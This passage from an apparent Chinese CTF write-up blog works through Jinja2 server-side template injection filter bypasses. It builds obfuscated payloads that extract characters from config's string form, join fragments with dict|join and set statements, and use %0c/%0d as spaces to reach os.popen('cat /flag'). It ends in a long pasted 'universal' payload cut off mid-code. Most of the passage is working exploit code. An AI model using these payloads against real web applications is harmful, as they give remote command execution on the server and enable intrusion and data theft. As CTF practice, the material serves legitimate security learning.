style="color:#f92672">|</span>join)(<span style="color:#ae81ff">74</span>))<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span><span style="color:#f92672">~</span>(dict(<span style="color:#f92672">in</span><span style="color:#f92672">=</span>a,it<span style="color:#f92672">=</span>b)<span style="color:#f92672">|</span>join())<span style="color:#f92672">~</span>(config<span style="color:#f92672">|</span>string()<span style="color:#f92672">|</span>list()<span style="color:#f92672">|</span>attr(dict(p<span style="color:#f92672">=</span>a,op<span style="color:#f92672">=</span>b)<span style="color:#f92672">|</span>join)(<span style="color:#ae81ff">74</span>))<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>)<span style="color:#f92672">|</span>attr((config<span style="color:#f92672">|</span>string()<span style="color:#f92672">|</span>list()<span style="color:#f92672">|</span>attr(dict(p<span style="color:#f92672">=</span>a,op<span style="color:#f92672">=</span>b)<span style="color:#f92672">|</span>join)(<span style="color:#ae81ff">74</span>))<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span><span style="color:#f92672">~</span>(dict(glo<span style="color:#f92672">=</span>a,bals<span style="color:#f92672">=</span>b)<span style="color:#f92672">|</span>join())<span style="color:#f92672">~</span>(config<span style="color:#f92672">|</span>string()<span style="color:#f92672">|</span>list()<span style="color:#f92672">|</span>attr(dict(p<span style="color:#f92672">=</span>a,op<span style="color:#f92672">=</span>b)<span style="color:#f92672">|</span>join)(<span style="color:#ae81ff">74</span>))<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>)}}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>想拿到config<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__[<span style="color:#e6db74">&#39;os&#39;</span>]<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;cat /flag&#39;</span>)<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>即config<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>__getitem__(<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;cat /flag&#39;</span>)<span style="color:#f92672">.</span>read()  忽略单引号
+</span></span><span style="display:flex;"><span>payload<span style="color:#960050;background-color:#1e0010">：</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{{config<span style="color:#f92672">|</span>attr((config<span style="color:#f92672">|</span>string()<span style="color:#f92672">|</span>list()<span style="color:#f92672">|</span>attr(dict(p<span style="color:#f92672">=</span>a,op<span style="color:#f92672">=</span>b)<span style="color:#f92672">|</span>join)(<span style="color:#ae81ff">74</span>))<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span><span style="color:#f92672">~</span>(dict(cla<span style="color:#f92672">=</span>a,ss<span style="color:#f92672">=</span>b)<span style="color:#f92672">|</span>join())<span style="color:#f92672">~</span>(config<span style="color:#f92672">|</span>string()<span style="color:#f92672">|</span>list()<span style="color:#f92672">|</span>attr(dict(p<span style="color:#f92672">=</span>a,op<span style="color:#f92672">=</span>b)<span style="color:#f92672">|</span>join)(<span style="color:#ae81ff">74</span>))<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>)<span style="color:#f92672">|</span>attr((config<span style="color:#f92672">|</span>string()<span style="color:#f92672">|</span>list()<span style="color:#f92672">|</span>attr(dict(p<span style="color:#f92672">=</span>a,op<span style="color:#f92672">=</span>b)<span style="color:#f92672">|</span>join)(<span style="color:#ae81ff">74</span>))<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span><span style="color:#f92672">~</span>(dict(<span style="color:#f92672">in</span><span style="color:#f92672">=</span>a,it<span style="color:#f92672">=</span>b)<span style="color:#f92672">|</span>join())<span style="color:#f92672">~</span>(config<span style="color:#f92672">|</span>string()<span style="color:#f92672">|</span>list()<span style="color:#f92672">|</span>attr(dict(p<span style="color:#f92672">=</span>a,op<span style="color:#f92672">=</span>b)<span style="color:#f92672">|</span>join)(<span style="color:#ae81ff">74</span>))<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>)<span style="color:#f92672">|</span>attr((config<span style="color:#f92672">|</span>string()<span style="color:#f92672">|</span>list()<span style="color:#f92672">|</span>attr(dict(p<span style="color:#f92672">=</span>a,op<span style="color:#f92672">=</span>b)<span style="color:#f92672">|</span>join)(<span style="color:#ae81ff">74</span>))<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span><span style="color:#f92672">~</span>(dict(glo<span style="color:#f92672">=</span>a,bals<span style="color:#f92672">=</span>b)<span style="color:#f92672">|</span>join())<span style="color:#f92672">~</span>(config<span style="color:#f92672">|</span>string()<span style="color:#f92672">|</span>list()<span style="color:#f92672">|</span>attr(dict(p<span style="color:#f92672">=</span>a,op<span style="color:#f92672">=</span>b)<span style="color:#f92672">|</span>join)(<span style="color:#ae81ff">74</span>))<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>)<span style="color:#f92672">|</span>attr((config<span style="color:#f92672">|</span>string()<span style="color:#f92672">|</span>list()<span style="color:#f92672">|</span>attr(dict(p<span style="color:#f92672">=</span>a,op<span style="color:#f92672">=</span>b)<span style="color:#f92672">|</span>join)(<span style="color:#ae81ff">74</span>))<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span><span style="color:#f92672">~</span>(dict(get<span style="color:#f92672">=</span>a,item<span style="color:#f92672">=</span>b)<span style="color:#f92672">|</span>join())<span style="color:#f92672">~</span>(config<span style="color:#f92672">|</span>string()<span style="color:#f92672">|</span>list()<span style="color:#f92672">|</span>attr(dict(p<span style="color:#f92672">=</span>a,op<span style="color:#f92672">=</span>b)<span style="color:#f92672">|</span>join)(<span style="color:#ae81ff">74</span>))<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>)(dict(o<span style="color:#f92672">=</span>a,s<span style="color:#f92672">=</span>b)<span style="color:#f92672">|</span>join())<span style="color:#f92672">|</span>attr(dict(po<span style="color:#f92672">=</span>a,pen<span style="color:#f92672">=</span>b)<span style="color:#f92672">|</span>join())(dict(ca<span style="color:#f92672">=</span>a,t<span style="color:#f92672">=</span>b)<span style="color:#f92672">|</span>join()<span style="color:#f92672">~</span>(config<span style="color:#f92672">|</span>string()<span style="color:#f92672">|</span>list()<span style="color:#f92672">|</span>attr(dict(p<span style="color:#f92672">=</span>a,op<span style="color:#f92672">=</span>b)<span style="color:#f92672">|</span>join)(<span style="color:#ae81ff">7</span>))<span style="color:#f92672">~</span>(config<span style="color:#f92672">|</span>string()<span style="color:#f92672">|</span>list()<span style="color:#f92672">|</span>attr(dict(p<span style="color:#f92672">=</span>a,op<span style="color:#f92672">=</span>b)<span style="color:#f92672">|</span>join)(<span style="color:#ae81ff">279</span>))<span style="color:#f92672">~</span>dict(fl<span style="color:#f92672">=</span>a,ag<span style="color:#f92672">=</span>b)<span style="color:#f92672">|</span>join())<span style="color:#f92672">|</span>attr(dict(re<span style="color:#f92672">=</span>a,ad<span style="color:#f92672">=</span>b)<span style="color:#f92672">|</span>join())()}}
+</span></span></code></pre></div><!-- raw HTML omitted -->
+<p>一步一步走，这个逻辑要是搞混了很难找错，还是挺费时间的</p>
+<p>继续尝试另外的思路</p>
+<p><strong>2，set 和 join 拼接</strong></p>
+<p>set拼接的话之前也是没有尝试过，原理大致如此 %0d绕空格%0c %0a也可以</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{<span style="color:#f92672">%</span>set<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>da<span style="color:#f92672">=</span>dict(Thn<span style="color:#f92672">=</span>b,Pkm<span style="color:#f92672">=</span>c)<span style="color:#f92672">|</span>join<span style="color:#f92672">%</span>}{{a}}
+</span></span></code></pre></div><!-- raw HTML omitted -->
+<p>确定我们的payload</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{lipsum<span style="color:#f92672">.</span>__globals__[<span style="color:#e6db74">&#39;os&#39;</span>]<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;cat /flag&#39;</span>)<span style="color:#f92672">.</span>read()}}
+</span></span><span style="display:flex;"><span>即
+</span></span><span style="display:flex;"><span>{{lipsum<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>__getitem__(<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;cat /flag&#39;</span>)<span style="color:#f92672">.</span>read()}}
+</span></span></code></pre></div><p>按上面的思路找到需要的字符</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>双下划线__
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">%</span>set<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>dxhx<span style="color:#f92672">=</span>config<span style="color:#f92672">|</span>string()<span style="color:#f92672">|</span>list()<span style="color:#f92672">|</span>attr(dict(p<span style="color:#f92672">=</span>a,op<span style="color:#f92672">=</span>b)<span style="color:#f92672">|</span>join)(<span style="color:#ae81ff">74</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span><span style="color:#f92672">%</span>}{{xhx}}
+</span></span><span style="display:flex;"><span>分隔符<span style="color:#f92672">/</span>
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">%</span>set<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>dfgf<span style="color:#f92672">=</span>config<span style="color:#f92672">|</span>string()<span style="color:#f92672">|</span>list()<span style="color:#f92672">|</span>attr(dict(p<span style="color:#f92672">=</span>a,op<span style="color:#f92672">=</span>b)<span style="color:#f92672">|</span>join)(<span style="color:#ae81ff">279</span>)<span style="color:#f92672">%</span>}{{fgf}}
+</span></span><span style="display:flex;"><span>空格
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">%</span>set<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>dkg<span style="color:#f92672">=</span>config<span style="color:#f92672">|</span>string()<span style="color:#f92672">|</span>list()<span style="color:#f92672">|</span>attr(dict(p<span style="color:#f92672">=</span>a,op<span style="color:#f92672">=</span>b)<span style="color:#f92672">|</span>join)(<span style="color:#ae81ff">7</span>)<span style="color:#f92672">%</span>}{{kg}}
+</span></span><span style="display:flex;"><span>点<span style="color:#f92672">.</span>
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">%</span>set<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>dpt<span style="color:#f92672">=</span>config<span style="color:#f92672">|</span>string()<span style="color:#f92672">|</span>list()<span style="color:#f92672">|</span>attr(dict(p<span style="color:#f92672">=</span>a,op<span style="color:#f92672">=</span>b)<span style="color:#f92672">|</span>join)(<span style="color:#ae81ff">191</span>)<span style="color:#f92672">%</span>}{{pt}}
+</span></span><span style="display:flex;"><span>单引号<span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">%</span>set<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>dyin<span style="color:#f92672">=</span>config<span style="color:#f92672">|</span>string()<span style="color:#f92672">|</span>list()<span style="color:#f92672">|</span>attr(dict(p<span style="color:#f92672">=</span>a,op<span style="color:#f92672">=</span>b)<span style="color:#f92672">|</span>join)(<span style="color:#ae81ff">9</span>)<span style="color:#f92672">%</span>}{{yin}}
+</span></span><span style="display:flex;"><span>左括号(
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">%</span>set<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>dleft<span style="color:#f92672">=</span>config<span style="color:#f92672">|</span>string()<span style="color:#f92672">|</span>list()<span style="color:#f92672">|</span>attr(dict(p<span style="color:#f92672">=</span>a,op<span style="color:#f92672">=</span>b)<span style="color:#f92672">|</span>join)(<span style="color:#ae81ff">201</span>)<span style="color:#f92672">%</span>}{{left}}
+</span></span><span style="display:flex;"><span>右括号)
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">%</span>set<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>dright<span style="color:#f92672">=</span>config<span style="color:#f92672">|</span>string()<span style="color:#f92672">|</span>list()<span style="color:#f92672">|</span>attr(dict(p<span style="color:#f92672">=</span>a,op<span style="color:#f92672">=</span>b)<span style="color:#f92672">|</span>join)(<span style="color:#ae81ff">209</span>)<span style="color:#f92672">%</span>}{{right}}
+</span></span><span style="display:flex;"><span>lipsum
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">%</span>set<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>dlps<span style="color:#f92672">=</span>dict(lip<span style="color:#f92672">=</span>b,sum<span style="color:#f92672">=</span>c)<span style="color:#f92672">|</span>join<span style="color:#f92672">%</span>}{{lps}}
+</span></span><span style="display:flex;"><span>golbals
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">%</span>set<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>dglb<span style="color:#f92672">=</span>dict(glo<span style="color:#f92672">=</span>b,bals<span style="color:#f92672">=</span>c)<span style="color:#f92672">|</span>join<span style="color:#f92672">%</span>}{{glb}}
+</span></span><span style="display:flex;"><span>getitem
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">%</span>set<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>dgtm<span style="color:#f92672">=</span>dict(get<span style="color:#f92672">=</span>b,item<span style="color:#f92672">=</span>c)<span style="color:#f92672">|</span>join<span style="color:#f92672">%</span>}{{gtm}}
+</span></span><span style="display:flex;"><span>os
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">%</span>set<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>do<span style="color:#f92672">=</span>dict(o<span style="color:#f92672">=</span>b,s<span style="color:#f92672">=</span>c)<span style="color:#f92672">|</span>join<span style="color:#f92672">%</span>}{{o}}
+</span></span><span style="display:flex;"><span>popen
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">%</span>set<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>dop<span style="color:#f92672">=</span>dict(po<span style="color:#f92672">=</span>b,pen<span style="color:#f92672">=</span>c)<span style="color:#f92672">|</span>join<span style="color:#f92672">%</span>}{{op}}
+</span></span><span style="display:flex;"><span>cat
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">%</span>set<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>dcat<span style="color:#f92672">=</span>dict(cat<span style="color:#f92672">=</span>c)<span style="color:#f92672">|</span>join<span style="color:#f92672">%</span>}{{cat}}
+</span></span><span style="display:flex;"><span>flag
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">%</span>set<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>dflag<span style="color:#f92672">=</span>dict(flag<span style="color:#f92672">=</span>c)<span style="color:#f92672">|</span>join<span style="color:#f92672">%</span>}{{flag}}
+</span></span><span style="display:flex;"><span>read
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">%</span>set<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>dre<span style="color:#f92672">=</span>dict(re<span style="color:#f92672">=</span>b,ad<span style="color:#f92672">=</span>c)<span style="color:#f92672">|</span>join<span style="color:#f92672">%</span>}{{re}}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>根据payload进行字符拼接:
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">%</span>set<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>dpld<span style="color:#f92672">=</span>lipsum<span style="color:#f92672">|</span>attr(xhx<span style="color:#f92672">~</span>glb<span style="color:#f92672">~</span>xhx)<span style="color:#f92672">|</span>attr(xhx<span style="color:#f92672">~</span>gtm<span style="color:#f92672">~</span>xhx)(o)<span style="color:#f92672">|</span>attr(op)(cat<span style="color:#f92672">~</span>kg<span style="color:#f92672">~</span>fgf<span style="color:#f92672">~</span>flag)<span style="color:#f92672">|</span>attr(re)()<span style="color:#f92672">%</span>}{{pld}}
+</span></span></code></pre></div><p>其实又在这里浪费很多时间找bug一度认为打不通换方法了，还去找点引号括号去了具体看方法3，原因是payload少写了read的构造，气死</p>
+<p>最终payload</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211241506305.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211241506305.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211241506305.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211241506305.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211241506305.png"
+        title="image-20221124150635121" /></p>
+<p>3，想尝试另外一种方式bypass</p>
+<p><a href="https://xz.aliyun.com/t/9584#toc-30" target="_blank" rel="noopener noreffer">https://xz.aliyun.com/t/9584#toc-30</a>
+</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{<span style="color:#f92672">%</span>set<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>dpld<span style="color:#f92672">=</span>(lps<span style="color:#f92672">~</span>pt<span style="color:#f92672">~</span>xhx<span style="color:#f92672">~</span>glb<span style="color:#f92672">~</span>xhx<span style="color:#f92672">~</span>pt<span style="color:#f92672">~</span>xhx<span style="color:#f92672">~</span>gtm<span style="color:#f92672">~</span>xhx<span style="color:#f92672">~</span>left<span style="color:#f92672">~</span>yin<span style="color:#f92672">~</span>o<span style="color:#f92672">~</span>yin<span style="color:#f92672">~</span>right<span style="color:#f92672">~</span>pt<span style="color:#f92672">~</span>op<span style="color:#f92672">~</span>left<span style="color:#f92672">~</span>yin<span style="color:#f92672">~</span>cat<span style="color:#f92672">~</span>kg<span style="color:#f92672">~</span>fgf<span style="color:#f92672">~</span>flag<span style="color:#f92672">~</span>yin<span style="color:#f92672">~</span>right<span style="color:#f92672">~</span>pt<span style="color:#f92672">~</span>re<span style="color:#f92672">~</span>left<span style="color:#f92672">~</span>right)<span style="color:#f92672">%</span>}{{pld}}
+</span></span></code></pre></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211241346526.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211241346526.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211241346526.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211241346526.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211241346526.png"
+        title="image-20221124134612417" /></p>
+<p>成功构造出<code>lipsum.__globals__.__getitem__('os').popen('cat /flag').read()</code></p>
+<p>然后将上面构造的各种变量添加到所谓的SSTI万能payload里面，尝试了很久我这个payload没有成功</p>
+<p>心态小炸，不试了</p>
+<p>原文的payload直接能打通： 只要把空格换成%0c</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{<span style="color:#f92672">%%</span><span style="color:#ae81ff">0</span>cset<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>czero<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">=%</span><span style="color:#ae81ff">0</span>c(self<span style="color:#f92672">|</span>int)<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">%</span>}{<span style="color:#f92672">%%</span><span style="color:#ae81ff">0</span>cset<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>cone<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">=%</span><span style="color:#ae81ff">0</span>c(zero<span style="color:#f92672">**</span>zero)<span style="color:#f92672">|</span>int<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">%</span>}{<span style="color:#f92672">%%</span><span style="color:#ae81ff">0</span>cset<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>ctwo<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">=%</span><span style="color:#ae81ff">0</span>c(zero<span style="color:#f92672">-</span>one<span style="color:#f92672">-</span>one)<span style="color:#f92672">|</span>abs<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">%</span>}{<span style="color:#f92672">%%</span><span style="color:#ae81ff">0</span>cset<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>cfour<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">=%</span><span style="color:#ae81ff">0</span>c(two<span style="color:#f92672">*</span>two)<span style="color:#f92672">|</span>int<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">%</span>}{<span style="color:#f92672">%%</span><span style="color:#ae81ff">0</span>cset<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>cfive<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">=%</span><span style="color:#ae81ff">0</span>c(two<span style="color:#f92672">*</span>two<span style="color:#f92672">*</span>two)<span style="color:#f92672">-</span>one<span style="color:#f92672">-</span>one<span style="color:#f92672">-</span>one<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">%</span>}{<span style="color:#f92672">%%</span><span style="color:#ae81ff">0</span>cset<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>cthree<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">=%</span><span style="color:#ae81ff">0</span>cfive<span style="color:#f92672">-</span>one<span style="color:#f92672">-</span>one<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">%</span>}{<span style="color:#f92672">%%</span><span style="color:#ae81ff">0</span>cset<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>cnine<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">=%</span><span style="color:#ae81ff">0</span>c(two<span style="color:#f92672">*</span>two<span style="color:#f92672">*</span>two<span style="color:#f92672">*</span>two<span style="color:#f92672">-</span>five<span style="color:#f92672">-</span>one<span style="color:#f92672">-</span>one)<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">%</span>}{<span style="color:#f92672">%%</span><span style="color:#ae81ff">0</span>cset<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>cseven<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">=%</span><span style="color:#ae81ff">0</span>c(zero<span style="color:#f92672">-</span>one<span style="color:#f92672">-</span>one<span style="color:#f92672">-</span>five)<span style="color:#f92672">|</span>abs<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">%</span>}{<span style="color:#f92672">%%</span><span style="color:#ae81ff">0</span>cset<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>cspace<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">=%</span><span style="color:#ae81ff">0</span>cself<span style="color:#f92672">|</span>string<span style="color:#f92672">|</span>min<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">%</span>}{<span style="color:#f92672">%%</span><span style="color:#ae81ff">0</span>cset<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>cpoint<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">=%</span><span style="color:#ae81ff">0</span>cself<span style="color:#f92672">|</span>float<span style="color:#f92672">|</span>string<span style="color:#f92672">|</span>min<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">%</span>}{<span style="color:#f92672">%%</span><span style="color:#ae81ff">0</span>cset<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>cc<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">=%</span><span style="color:#ae81ff">0</span>cdict(c<span style="color:#f92672">=</span>aa)<span style="color:#f92672">|</span>reverse<span style="color:#f92672">|</span>first<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">%</span>}{<span style="color:#f92672">%%</span><span style="color:#ae81ff">0</span>cset<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>cbfh<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">=%</span><span style="color:#ae81ff">0</span>cself<span style="color:#f92672">|</span>string<span style="color:#f92672">|</span>urlencode<span style="color:#f92672">|</span>first<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">%</span>}{<span style="color:#f92672">%%</span><span style="color:#ae81ff">0</span>cset<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>cbfhc<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">=%</span><span style="color:#ae81ff">0</span>cbfh<span style="color:#f92672">~</span>c<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">%</span>}{<span style="color:#f92672">%%</span><span style="color:#ae81ff">0</span>cset<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>cslas<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">=%</span><span style="color:#ae81ff">0</span>cbfhc<span style="color:#f92672">%</span>((four<span style="color:#f92672">~</span>seven)<span style="color:#f92672">|</span>int)<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">%</span>}{<span style="color:#f92672">%%</span><span style="color:#ae81ff">0</span>cset<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>cyin<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">=%</span><span style="color:#ae81ff">0</span>cbfhc<span style="color:#f92672">%</span>((three<span style="color:#f92672">~</span>nine)<span style="color:#f92672">|</span>int)<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">%</span>}{<span style="color:#f92672">%%</span><span style="color:#ae81ff">0</span>cset<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>cxhx<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">=%</span><span style="color:#ae81ff">0</span>cbfhc<span style="color:#f92672">%</span>((nine<span style="color:#f92672">~</span>five)<span style="color:#f92672">|</span>int)<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">%</span>}{<span style="color:#f92672">%%</span><span style="color:#ae81ff">0</span>cset<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>cright<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">=%</span><span style="color:#ae81ff">0</span>cbfhc<span style="color:#f92672">%</span>((four<span style="color:#f92672">~</span>one)<span style="color:#f92672">|</span>int)<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">%</span>}{<span style="color:#f92672">%%</span><span style="color:#ae81ff">0</span>cset<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>cleft<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">=%</span><span style="color:#ae81ff">0</span>cbfhc<span style="color:#f92672">%</span>((four<span style="color:#f92672">~</span>zero)<span style="color:#f92672">|</span>int)<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">%</span>}{<span style="color:#f92672">%%</span><span style="color:#ae81ff">0</span>cset<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>cbut<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">=%</span><span style="color:#ae81ff">0</span>cdict(buil<span style="color:#f92672">=</span>aa,tins<span style="color:#f92672">=</span>dd)<span style="color:#f92672">|</span>join<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">%</span>}{<span style="color:#f92672">%%</span><span style="color:#ae81ff">0</span>cset<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>cimp<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">=%</span><span style="color:#ae81ff">0</span>cdict(imp<span style="color:#f92672">=</span>aa,ort<span style="color:#f92672">=</span>dd)<span style="color:#f92672">|</span>join<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">%</span>}{<span style="color:#f92672">%%</span><span style="color:#ae81ff">0</span>cset<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>cpon<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">=%</span><span style="color:#ae81ff">0</span>cdict(po<span style="color:#f92672">=</span>aa,pen<span style="color:#f92672">=</span>dd)<span style="color:#f92672">|</span>join<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">%</span>}{<span style="color:#f92672">%%</span><span style="color:#ae81ff">0</span>cset<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>cso<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">=%</span><span style="color:#ae81ff">0</span>cdict(o<span style="color:#f92672">=</span>aa,s<span 